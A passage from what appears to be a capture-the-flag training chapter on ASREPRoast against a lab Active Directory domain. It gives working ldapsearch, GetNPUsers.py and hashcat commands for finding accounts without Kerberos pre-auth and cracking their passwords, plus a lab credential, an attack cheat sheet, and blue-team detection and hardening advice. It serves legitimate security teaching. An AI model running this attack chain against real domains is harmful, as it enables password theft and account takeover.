+</code></pre></div>
+<p><code>23</code> is the encryption type (RC4-HMAC). Hashcat mode is <strong>18200</strong>.</p>
+<hr />
+<h2 id="tool-primer">Tool Primer</h2>
+<h3 id="ldap-query-for-as-rep-roastable-users">LDAP query for AS-REP-roastable users</h3>
+<p>Authenticated:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a>ldapsearch<span class="w"> </span>-x<span class="w"> </span>-LLL<span class="w"> </span>-H<span class="w"> </span>ldap://&lt;dc&gt;<span class="w"> </span><span class="se">\</span>
+<a id="__codelineno-2-2" name="__codelineno-2-2" href="#__codelineno-2-2"></a><span class="w">  </span>-D<span class="w"> </span><span class="s2">&quot;CORP\j.chen&quot;</span><span class="w"> </span>-w<span class="w"> </span><span class="s1">&#39;Welcome2026#&#39;</span><span class="w"> </span><span class="se">\</span>
+<a id="__codelineno-2-3" name="__codelineno-2-3" href="#__codelineno-2-3"></a><span class="w">  </span>-b<span class="w"> </span><span class="s2">&quot;DC=corp,DC=nordport,DC=local&quot;</span><span class="w"> </span><span class="se">\</span>
+<a id="__codelineno-2-4" name="__codelineno-2-4" href="#__codelineno-2-4"></a><span class="w">  </span><span class="s2">&quot;(&amp;(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))&quot;</span><span class="w"> </span><span class="se">\</span>
+<a id="__codelineno-2-5" name="__codelineno-2-5" href="#__codelineno-2-5"></a><span class="w">  </span>sAMAccountName
+</code></pre></div>
+<p>Unauthenticated alternative (if anonymous LDAP is enabled, see Exercise 2.1):</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a>ldapsearch<span class="w"> </span>-x<span class="w"> </span>-LLL<span class="w"> </span>-H<span class="w"> </span>ldap://&lt;dc&gt;<span class="w"> </span><span class="se">\</span>
+<a id="__codelineno-3-2" name="__codelineno-3-2" href="#__codelineno-3-2"></a><span class="w">  </span>-b<span class="w"> </span><span class="s2">&quot;DC=corp,DC=nordport,DC=local&quot;</span><span class="w"> </span><span class="se">\</span>
+<a id="__codelineno-3-3" name="__codelineno-3-3" href="#__codelineno-3-3"></a><span class="w">  </span><span class="s2">&quot;(&amp;(objectCategory=person)(userAccountControl:1.2.840.113556.1.4.803:=4194304))&quot;</span><span class="w"> </span><span class="se">\</span>
+<a id="__codelineno-3-4" name="__codelineno-3-4" href="#__codelineno-3-4"></a><span class="w">  </span>sAMAccountName
+</code></pre></div>
+<h3 id="getnpuserspy">GetNPUsers.py</h3>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a>GetNPUsers.py<span class="w"> </span>corp.nordport.local/<span class="w"> </span>-no-pass<span class="w"> </span>-usersfile<span class="w"> </span>users.txt<span class="w"> </span>-dc-ip<span class="w"> </span>&lt;dc&gt;<span class="w"> </span>-outputfile<span class="w"> </span>asrep.hash
+</code></pre></div>
+<p>Or attack a specific user without a list:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a>GetNPUsers.py<span class="w"> </span>corp.nordport.local/svc_legacy_&lt;token&gt;<span class="w"> </span>-no-pass<span class="w"> </span>-dc-ip<span class="w"> </span>&lt;dc&gt;
+</code></pre></div>
+<p><code>-no-pass</code> tells impacket to skip the pre-auth attempt. <code>-usersfile</code> is a one-username-per-line file. <code>-outputfile</code> writes the hash directly to a file in hashcat format.</p>
+<h3 id="hashcat-mode-18200">hashcat mode 18200</h3>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-6-1" name="__codelineno-6-1" href="#__codelineno-6-1"></a>hashcat<span class="w"> </span>-m<span class="w"> </span><span class="m">18200</span><span class="w"> </span>asrep.hash<span class="w"> </span>/usr/share/wordlists/rockyou.txt<span class="w"> </span><span class="se">\</span>
+<a id="__codelineno-6-2" name="__codelineno-6-2" href="#__codelineno-6-2"></a><span class="w">  </span>-r<span class="w"> </span>/usr/share/hashcat/rules/best64.rule
+</code></pre></div>
+<hr />
+<h2 id="walkthrough">Walkthrough</h2>
+<h3 id="step-1-find-as-rep-roastable-accounts">Step 1: Find AS-REP-roastable Accounts</h3>
+<p>The first step is discovery. The bitwise LDAP filter compares each user's <code>userAccountControl</code> against <code>0x400000</code> (decimal 4194304) and returns only the users with that bit set. Running it as <code>j.chen</code> rather than anonymously is faster (no anonymous-bind handshake) and works regardless of whether the domain allows anonymous LDAP.</p>
+<div class="admonition kali">
+<p class="admonition-title">Kali - Pull every user with DONT_REQ_PREAUTH</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-7-1" name="__codelineno-7-1" href="#__codelineno-7-1"></a>ldapsearch<span class="w"> </span>-x<span class="w"> </span>-LLL<span class="w"> </span>-H<span class="w"> </span>ldap://&lt;dc_ip&gt;<span class="w"> </span><span class="se">\</span>
+<a id="__codelineno-7-2" name="__codelineno-7-2" href="#__codelineno-7-2"></a><span class="w">  </span>-D<span class="w"> </span><span class="s2">&quot;CORP\j.chen&quot;</span><span class="w"> </span>-w<span class="w"> </span><span class="s1">&#39;Welcome2026#&#39;</span><span class="w"> </span><span class="se">\</span>
+<a id="__codelineno-7-3" name="__codelineno-7-3" href="#__codelineno-7-3"></a><span class="w">  </span>-b<span class="w"> </span><span class="s2">&quot;DC=corp,DC=nordport,DC=local&quot;</span><span class="w"> </span><span class="se">\</span>
+<a id="__codelineno-7-4" name="__codelineno-7-4" href="#__codelineno-7-4"></a><span class="w">  </span><span class="s2">&quot;(&amp;(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))&quot;</span><span class="w"> </span><span class="se">\</span>
+<a id="__codelineno-7-5" name="__codelineno-7-5" href="#__codelineno-7-5"></a><span class="w">  </span>sAMAccountName<span class="w"> </span><span class="se">\</span>
+<a id="__codelineno-7-6" name="__codelineno-7-6" href="#__codelineno-7-6"></a><span class="w">  </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span>sAMAccountName
+</code></pre></div>
+<table>
+<thead>
+<tr>
+<th>Token</th>
+<th>Effect</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>(&amp;(...)(...))</code></td>
+<td>LDAP <code>AND</code> of multiple sub-filters.</td>
+</tr>
+<tr>
+<td><code>objectCategory=person</code></td>
+<td>Restrict to user objects (excludes computers and security groups).</td>
+</tr>
+<tr>
+<td><code>objectClass=user</code></td>
+<td>Belt-and-suspenders user-class filter.</td>
+</tr>
+<tr>
+<td><code>userAccountControl:1.2.840.113556.1.4.803:=4194304</code></td>
+<td>Bitwise-AND match against the UAC field; 4194304 = <code>0x400000</code> = DONT_REQ_PREAUTH.</td>
+</tr>
+<tr>
+<td><code>sAMAccountName</code></td>
+<td>Only return this single attribute; less data over the wire.</td>
+</tr>
+<tr>
+<td><code>\| grep sAMAccountName</code></td>
+<td>Filter the LDIF output to just the username lines.</td>
+</tr>
+</tbody>
+</table>
+<p>Each line shows a candidate. Yours is <code>svc_legacy_&lt;token&gt;</code>. Other students' candidates also appear; ignore them.</p>
+</div>
+<h3 id="step-2-build-a-users-file">Step 2: Build a Users File</h3>
+<p><code>GetNPUsers.py</code> accepts either a single username on the command line or a list file via <code>-usersfile</code>. Even with one user, the file form is what you would use in the real world (you would feed an enumerated list of every domain user) so we follow the same pattern.</p>
+<div class="admonition kali">
+<p class="admonition-title">Kali - Save the candidate list</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-8-1" name="__codelineno-8-1" href="#__codelineno-8-1"></a>mkdir<span class="w"> </span>-p<span class="w"> </span>~/work/adpt-3-02<span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="nb">cd</span><span class="w"> </span>~/work/adpt-3-02
+<a id="__codelineno-8-2" name="__codelineno-8-2" href="#__codelineno-8-2"></a><span class="nb">echo</span><span class="w"> </span><span class="s2">&quot;svc_legacy_</span><span class="si">${</span><span class="nv">OCR_SCOPE_TOKEN</span><span class="si">}</span><span class="s2">&quot;</span><span class="w"> </span>&gt;<span class="w"> </span>users.txt
+</code></pre></div>
+<p>Verify the file contains your token: <code>cat users.txt</code>. If it shows <code>svc_legacy_</code> with no suffix, the variable was empty; re-source your shell or check Step 1 of any prior chapter for the <code>echo $OCR_SCOPE_TOKEN</code> confirmation.</p>
+</div>
+<h3 id="step-3-request-the-as-rep">Step 3: Request the AS-REP</h3>
+<p><code>GetNPUsers.py</code> is part of the impacket suite. With <code>-no-pass</code> it sends an AS-REQ without the <code>pA-ENC-TIMESTAMP</code> field; the KDC checks each requested user's UAC. Users with pre-auth required produce <code>KDC_ERR_PREAUTH_REQUIRED</code> (impacket prints <code>[-]</code>). Users with pre-auth disabled produce a usable AS-REP that impacket formats as a hashcat-ready string.</p>
+<div class="admonition kali">
+<p class="admonition-title">Kali - GetNPUsers without authentication</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-9-1" name="__codelineno-9-1" href="#__codelineno-9-1"></a>GetNPUsers.py<span class="w"> </span>corp.nordport.local/<span class="w"> </span>-no-pass<span class="w"> </span>-usersfile<span class="w"> </span>users.txt<span class="w"> </span><span class="se">\</span>
+<a id="__codelineno-9-2" name="__codelineno-9-2" href="#__codelineno-9-2"></a><span class="w">  </span>-dc-ip<span class="w"> </span>&lt;dc_ip&gt;<span class="w"> </span>-outputfile<span class="w"> </span>asrep.hash
+<a id="__codelineno-9-3" name="__codelineno-9-3" href="#__codelineno-9-3"></a>cat<span class="w"> </span>asrep.hash
+</code></pre></div>
+<table>
+<thead>
+<tr>
+<th>Flag</th>
+<th>Effect</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>&lt;realm&gt;/</code></td>
+<td>Domain realm with trailing slash and no user; "list mode".</td>
+</tr>
+<tr>
+<td><code>-no-pass</code></td>
+<td>Skip the pre-auth attempt; just send the AS-REQ.</td>
+</tr>
+<tr>
+<td><code>-usersfile users.txt</code></td>
+<td>One username per line, queried in turn.</td>
+</tr>
+<tr>
+<td><code>-dc-ip &lt;ip&gt;</code></td>
+<td>Skip DNS for the KDC; talk to the IP directly.</td>
+</tr>
+<tr>
+<td><code>-outputfile asrep.hash</code></td>
+<td>Write hashcat-formatted hashes to file.</td>
+</tr>
+</tbody>
+</table>
+<p>The file should contain one line in <code>$krb5asrep$23$svc_legacy_&lt;token&gt;@CORP.NORDPORT.LOCAL:...$...</code> format. The <code>23</code> after <code>$krb5asrep$</code> is the encryption type (RC4-HMAC); if it shows <code>17</code> or <code>18</code> you got AES and need hashcat mode 18201 or 18202 in Step 4.</p>
+</div>
+<h3 id="step-4-crack-with-hashcat">Step 4: Crack with hashcat</h3>
+<p>Mode 18200 understands the <code>$krb5asrep$23$</code> format. Hashcat hashes each candidate password with RC4-HMAC, computes the expected response, and compares to the captured hash. The seeded password is in <code>rockyou.txt</code>; <code>best64.rule</code> covers the typical mutations (number suffix, case toggle, leetspeak).</p>
+<div class="admonition kali">
+<p class="admonition-title">Kali - Crack the AS-REP</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-10-1" name="__codelineno-10-1" href="#__codelineno-10-1"></a>hashcat<span class="w"> </span>-m<span class="w"> </span><span class="m">18200</span><span class="w"> </span>asrep.hash<span class="w"> </span>/usr/share/wordlists/rockyou.txt<span class="w"> </span><span class="se">\</span>
+<a id="__codelineno-10-2" name="__codelineno-10-2" href="#__codelineno-10-2"></a><span class="w">  </span>-r<span class="w"> </span>/usr/share/hashcat/rules/best64.rule
+</code></pre></div>
+<table>
+<thead>
+<tr>
+<th>Flag</th>
+<th>Effect</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>-m 18200</code></td>
+<td>Net-Kerberos AS-REP RC4. Switch to 18201/18202 for AES.</td>
+</tr>
+<tr>
+<td><code>&lt;hash_file&gt;</code></td>
+<td>First positional.</td>
+</tr>
+<tr>
+<td><code>&lt;wordlist&gt;</code></td>
+<td>Second positional.</td>
+</tr>
+<tr>
+<td><code>-r &lt;rule&gt;</code></td>
+<td>Apply mutations from the rule file.</td>
+</tr>
+</tbody>
+</table>
+<p>On modest hardware the seeded password cracks within minutes. When done:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-11-1" name="__codelineno-11-1" href="#__codelineno-11-1"></a>hashcat<span class="w"> </span>-m<span class="w"> </span><span class="m">18200</span><span class="w"> </span>asrep.hash<span class="w"> </span>--show
+</code></pre></div>
+<p>The trailing field after the colon is the plaintext.</p>
+</div>
+<h3 id="step-5-submit-the-plaintext">Step 5: Submit the Plaintext</h3>
+<p>The plaintext IS the flag for this exercise. Wrap the recovered plaintext in <code>OCR{...}</code> and submit, so a recovered plaintext of <code>&lt;plaintext&gt;</code> becomes <code>OCR{&lt;plaintext&gt;}</code>.</p>
+<div class="admonition warning">
+<p class="admonition-title">Common gotchas</p>
+<ul>
+<li><strong>etype mismatch</strong>: if the captured hash starts with <code>$krb5asrep$17$</code> or <code>$krb5asrep$18$</code>, mode 18200 returns "no hashes loaded". Re-run with <code>-m 18201</code> (AES128) or <code>-m 18202</code> (AES256).</li>
+<li><strong>Realm casing</strong>: impacket is strict about realm form. <code>CORP.NORDPORT.LOCAL/</code> (uppercase) is canonical; lowercase typically works but inconsistent casing breaks some impacket versions.</li>
+<li><strong>DC clock skew</strong>: Kerberos rejects timestamps more than 5 minutes off. <code>chronyc tracking</code> should show the Kali clock within 60 seconds of the DC. If skew is large, <code>sudo ntpdate &lt;dc_ip&gt;</code> first.</li>
+<li><strong>No candidates returned</strong>: the LDAP filter requires authentication to read UAC on most domains. If anonymous bind is disabled, you must have at least one valid credential to enumerate. j.chen suffices.</li>
+</ul>
+</div>
+<hr />
+<h2 id="blue-team-perspective">Blue Team Perspective</h2>
+<p>ASREPRoast is detectable on the DC the moment it happens. The detection is one event ID, two filters, and a SIEM rule.</p>
+<table>
+<thead>
+<tr>
+<th>Activity</th>
+<th>Event ID</th>
+<th>Field giveaway</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>AS-REP issued without preauth</td>
+<td>4768</td>
+<td><code>Pre-Authentication Type = 0</code></td>
+</tr>
+<tr>
+<td>Account flagged with DONT_REQ_PREAUTH</td>
+<td>4738</td>
+<td><code>userAccountControl</code> includes <code>0x400000</code></td>
+</tr>
+<tr>
+<td>Bulk AS-REQ enumeration</td>
+<td>4768 burst from one IP</td>
+<td>Source IP rate spike</td>
+</tr>
+<tr>
+<td>ASREP detection (MDI)</td>
+<td>"Suspicious Kerberos AS-REP"</td>
+<td>Defender for Identity</td>
+</tr>
+</tbody>
+</table>
+<div class="admonition info">
+<p class="admonition-title">What detection looks like</p>
+<p>A normal environment generates approximately zero 4768 events with <code>Pre-Authentication Type = 0</code> in any 24-hour window. Any non-zero count from a single source IP is high-confidence enumeration. SIEM rule: alert when <code>Event ID = 4768 AND Pre-Authentication Type = 0</code>. The cardinality is low enough to investigate every hit.</p>
+</div>
+<h2 id="hardening-note">Hardening Note</h2>
+<p>The vulnerability lives entirely in one bit on one attribute on a small number of accounts. Audit and fix.</p>
+<div class="admonition tip">
+<p class="admonition-title">ASREPRoast hardening</p>
+<ul>
+<li>Run an LDAP audit query weekly: <code>(userAccountControl:1.2.840.113556.1.4.803:=4194304)</code>. Any result is a finding.</li>
+<li>Clear the <code>DONT_REQ_PREAUTH</code> bit on every account: <code>Set-ADAccountControl -Identity &lt;user&gt; -DoesNotRequirePreAuth $false</code>.</li>
+<li>Disable RC4 forest-wide via GPO <code>Network security: Configure encryption types allowed for Kerberos = AES128, AES256</code>. Forces AES, drastically slows offline cracking.</li>
+<li>Move service accounts to <strong>gMSAs</strong> so the password is auto-rotated and far too long to crack.</li>
+<li>Build SIEM detection: 4768 with <code>Pre-Authentication Type = 0</code> from any source IP. Alert on any hit.</li>
+</ul>
+</div>
+<hr />
+<h3 id="record-your-findings">Record Your Findings</h3>
+<blockquote>
+<p><strong>Vulnerable account:</strong></p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-12-1" name="__codelineno-12-1" href="#__codelineno-12-1"></a>svc_legacy_&lt;token&gt;
+</code></pre></div>
+<p><strong>AS-REP hash type:</strong></p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-13-1" name="__codelineno-13-1" href="#__codelineno-13-1"></a>$krb5asrep$23 (RC4-HMAC), hashcat mode 18200
+</code></pre></div>
+<p><strong>Cracked plaintext (= flag):</strong></p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-14-1" name="__codelineno-14-1" href="#__codelineno-14-1"></a>(your password)
+</code></pre></div>
+</blockquote>
+<hr />
+<h2 id="analysis-questions">Analysis Questions</h2>
+<p><strong>1. Why is the AS-REP enc-part encrypted with the user's key rather than the krbtgt key, given that the AS-REP is supposed to issue a TGT?</strong></p>
+<details class="note">
+<summary>Reveal Answer</summary>
+<p>The AS-REP carries two encrypted blobs. The <strong>TGT body</strong> (inside <code>ticket.enc-part</code>) is encrypted with <code>krbtgt</code>'s key so only KDCs can read it. The <strong>enc-part</strong> (outside the ticket, at the message level) contains the session key, ticket lifetime, and other client-needed metadata; it is encrypted with the <strong>user's</strong> key so the legitimate user can decrypt it and learn the session key. The user must learn the session key to use the TGT for subsequent TGS-REQs. ASREPRoast attacks the message-level enc-part, not the TGT body. Cracking the enc-part yields the user's password but does not yield the TGT contents (which would be a much more powerful attack; and is the krbtgt-key forgery known as a golden ticket).</p>
+</details>
+<p><strong>2. The encryption type in the AS-REP can be RC4-HMAC, AES128, or AES256. RC4 is 18200; AES variants are 18201, 18202. What controls which encryption type the KDC uses, and how can an attacker influence it?</strong></p>
+<details class="note">
+<summary>Reveal Answer</summary>
+<p>The encryption type the KDC uses for the AS-REP is determined by the user's <code>msDS-SupportedEncryptionTypes</code> attribute (or, if not set, the domain default), intersected with the encryption types the client says it supports in the AS-REQ <code>etype</code> field. An attacker can request RC4-HMAC explicitly by setting the <code>etype</code> to <code>arcfour-hmac</code> only, which downgrades the response to RC4 if the user's account allows it. RC4 is the most desirable target for cracking because it is significantly faster to compute than AES, often by 2-10x. Modern AD environments disable RC4 globally via the <code>Network security: Configure encryption types allowed for Kerberos</code> GPO setting; when RC4 is disabled, the AS-REP comes back AES-encrypted (18201/18202) and cracking is slower but still possible. Always check the etype field of the captured hash before queuing a long-running crack job.</p>
+</details>
+<p><strong>3. ASREPRoast does not produce any KDC error, only a successful AS-REP. From a defender's perspective, how do you detect an attack?</strong></p>
+<details class="note">
+<summary>Reveal Answer</summary>
+<p>The defender's primary signal is <strong>anomalous volume of AS-REQs without pre-auth</strong> from a single source IP, especially against accounts that should never authenticate without pre-auth. Event ID 4768 (Kerberos TGT request) is the data source; filter for <code>Pre-Authentication Type = 0</code> and group by source IP. A normal environment has near-zero such events; a single source generating dozens per minute is an active enumeration attempt. The secondary signal is creation or modification of the <code>DONT_REQ_PREAUTH</code> flag on any account: event 4738 (user account changed) with <code>userAccountControl</code> containing <code>0x400000</code>. Both signals are easy to put into a SIEM rule. The hardening control is to ensure no production account has the flag set; run a weekly LDAP query for <code>(userAccountControl:1.2.840.113556.1.4.803:=4194304)</code> and treat any result as a finding.</p>
+</details>
+<hr />
+<h2 id="key-takeaways">Key Takeaways</h2>
+<ul>
+<li><code>DONT_REQ_PREAUTH</code> (<code>0x400000</code>) makes a user's AS-REP issuable without pre-auth.</li>
+<li>The AS-REP enc-part is encrypted with the user's key and crackable offline.</li>
+<li>Hashcat mode 18200 (RC4) or 18201/18202 (AES variants) cracks the captured hash.</li>
+<li>The LDAP filter <code>(userAccountControl:1.2.840.113556.1.4.803:=4194304)</code> finds candidates in one query.</li>
+<li>Defenders detect via 4768 events with <code>Pre-Auth Type = 0</code> and per-source rate spikes.</li>
+</ul>
+<h2 id="cheat-sheet-recap">Cheat Sheet Recap</h2>
+<p>The four operations below are the entire attack chain. Memorize them; this is the highest-yield Kerberos attack on most internal pentests.</p>
+<table>
+<thead>
+<tr>
+<th>Goal</th>
+<th>Command</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Find ASREPRoast candidates</td>
+<td><code>ldapsearch -x -LLL -H ldap://&lt;dc&gt; -D "&lt;DOMAIN&gt;\&lt;u&gt;" -w '&lt;pw&gt;' -b "&lt;DN&gt;" "(userAccountControl:1.2.840.113556.1.4.803:=4194304)" sAMAccountName</code></td>
+</tr>
+<tr>
+<td>Request AS-REP unauthenticated</td>
+<td><code>GetNPUsers.py &lt;domain&gt;/ -no-pass -usersfile users.txt -dc-ip &lt;dc&gt; -outputfile asrep.hash</code></td>
+</tr>
+<tr>
+<td>Crack RC4 AS-REP</td>
+<td><code>hashcat -m 18200 asrep.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule</code></td>
+</tr>
+<tr>
+<td>Crack AES AS-REP</td>
+<td><code>hashcat -m 18202 asrep.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule</code></td>
+</tr>
+</tbody>
+</table>
+<hr />
+<h2 id="spaced-repetition">Spaced Repetition</h2>
+<p><strong>Card 1: AS-REP Hash Mode</strong></p>
+<p>Q: What hashcat mode cracks an <code>$krb5asrep$23$</code> hash, and what does the <code>23</code> mean?</p>
+<details class="note">
+<summary>Answer</summary>
+<p>Mode 18200. The <code>23</code> is the Kerberos encryption type for RC4-HMAC. AES128 is type 17 (mode 18201), AES256 is type 18 (mode 18202). The numeric type maps to RFC 3961 algorithm identifiers; <code>23</code> for ARCFOUR-HMAC is historically labeled <code>arcfour-hmac-md5</code>.</p>
+</details>
+<p><strong>Card 2: GetNPUsers Without Credentials</strong></p>
+<p>Q: Write the GetNPUsers.py command to request AS-REPs for users listed in <code>users.txt</code> against <code>corp.local</code> at DC <code>10.10.10.10</code>, with no authentication, writing output to <code>asrep.hash</code>.</p>
+<details class="note">
+<summary>Answer</summary>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-15-1" name="__codelineno-15-1" href="#__codelineno-15-1"></a>GetNPUsers.py<span class="w"> </span>corp.local/<span class="w"> </span>-no-pass<span class="w"> </span>-usersfile<span class="w"> </span>users.txt<span class="w"> </span><span class="se">\</span>
+<a id="__codelineno-15-2" name="__codelineno-15-2" href="#__codelineno-15-2"></a><span class="w">  </span>-dc-ip<span class="w"> </span><span class="m">10</span>.10.10.10<span class="w"> </span>-outputfile<span class="w"> </span>asrep.hash
+</code></pre></div>
+<p><code>-no-pass</code> skips the pre-auth attempt. The trailing <code>/</code> after the realm and before nothing else means "no specific user, list mode". To target one user: <code>GetNPUsers.py corp.local/userone -no-pass -dc-ip 10.10.10.10</code>.</p>
+</details>
+<p><strong>Card 3: LDAP Filter for Pre-Auth Disabled</strong></p>
+<p>Q: Write the LDAP filter that returns all users with <code>DONT_REQ_PREAUTH</code> set.</p>
+<details class="note">
+<summary>Answer</summary>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-16-1" name="__codelineno-16-1" href="#__codelineno-16-1"></a>(&amp;(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))
+</code></pre></div>
+<p>OID <code>1.2.840.113556.1.4.803</code> is <code>LDAP_MATCHING_RULE_BIT_AND</code>. The decimal <code>4194304</code> is <code>0x400000</code>, the <code>DONT_REQ_PREAUTH</code> bit. Use <code>1.2.840.113556.1.4.804</code> for OR matching.</p>
+</details>
+<p><strong>Card 4: Defender Detection Signal</strong></p>
+<p>Q: What event ID and field combination indicates an in-progress ASREPRoast?</p>
+<details class="note">
+<summary>Answer</summary>
+<p>Windows event 4768 (Kerberos TGT request) with <code>Pre-Authentication Type = 0</code>. A normal environment has near-zero such events; a sudden cluster from one source IP is the signal. Add a SIEM rule: more than 5 such events in 60 seconds from a single source IP. The hardening control is ensuring no production user has <code>DONT_REQ_PREAUTH</code> set; weekly LDAP audit will catch creeping misconfigurations.</p>
+</details>
+<p><strong>Card 5: AS-REP Encryption Etype Control</strong></p>
+<p>Q: Why might an attacker explicitly request RC4-HMAC (<code>etype 23</code>) from the KDC, and how is that done?</p>
+<details class="note">
+<summary>Answer</summary>
+<p>RC4-HMAC cracks 2-10x faster than AES variants on the same hardware. An attacker requests it by setting the <code>etype</code> field of the AS-REQ to <code>arcfour-hmac</code> only. The KDC honors the request if the user's <code>msDS-SupportedEncryptionTypes</code> permits RC4. Modern environments disable RC4 globally via <code>Network security: Configure encryption types allowed for Kerberos</code>, which forces AES and slows cracking. Check the captured hash format: <code>$krb5asrep$23$</code> is RC4, <code>$krb5asrep$17$</code> is AES128, <code>$krb5asrep$18$</code> is AES256.</p>
+</details>
+
+
+
+
+
+
+
+
+
+
+
+
+                
+              </article>
+            </div>
+          
+          
+<script>var target=document.getElementById(location.hash.slice(1));target&&target.name&&(target.checked=target.name.startsWith("__tabbed_"))</script>
+        </div>
+        
+          <button type="button" class="md-top md-icon" data-md-component="top" hidden>
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M13 20h-2V8l-5.5 5.5-1.42-1.42L12 4.16l7.92 7.92-1.42 1.42L13 8z"/></svg>
+  Back to top
+</button>
+        
+      </main>
+      
+        <footer class="md-footer">
+  
+  <div class="md-footer-meta md-typeset">
+    <div class="md-footer-meta__inner md-grid">
+      <div class="md-copyright">
+  
+  
+    Made with
+    <a href="https://squidfunk.github.io/mkdocs-material/" target="_blank" rel="noopener">
+      Material for MkDocs
+    </a>
+  
+</div>
+      
+    </div>
+  </div>
+</footer>
+      
+    </div>
+    <div class="md-dialog" data-md-component="dialog">
+      <div class="md-dialog__inner md-typeset"></div>
+    </div>
+    
+    
+    
+      
+      
+      <script id="__config" type="application/json">{"annotate": null, "base": "../..", "features": ["navigation.instant", "navigation.tracking", "navigation.sections", "navigation.expand", "navigation.top", "content.code.copy"], "search": "../../assets/javascripts/workers/search.2c215733.min.js", "tags": null, "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}, "version": null}</script>
+    
+    
+      <script src="../../assets/javascripts/bundle.79ae519e.min.js"></script>
+      
+        <script src="../../javascripts/mermaid-fix.js?v=4"></script>
+      
+        <script src="../../javascripts/pdf-export.js?v=2"></script>
+      
+        <script src="https://cdnjs.cloudflare.com/ajax/libs/html2pdf.js/0.10.1/html2pdf.bundle.min.js"></script>
+      
+    
+  </body>
+</html>
